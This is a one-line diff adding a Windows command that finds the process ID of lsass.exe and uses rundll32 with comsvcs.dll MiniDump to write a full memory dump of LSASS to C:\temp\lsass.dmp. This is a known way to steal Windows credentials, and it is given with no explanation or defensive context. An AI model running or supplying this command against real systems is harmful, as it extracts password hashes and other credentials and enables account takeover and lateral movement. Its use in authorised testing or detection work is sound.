@@ -1,0 +1,1 @@
+for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do powershell -c C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B C:\temp\lsass.dmp full
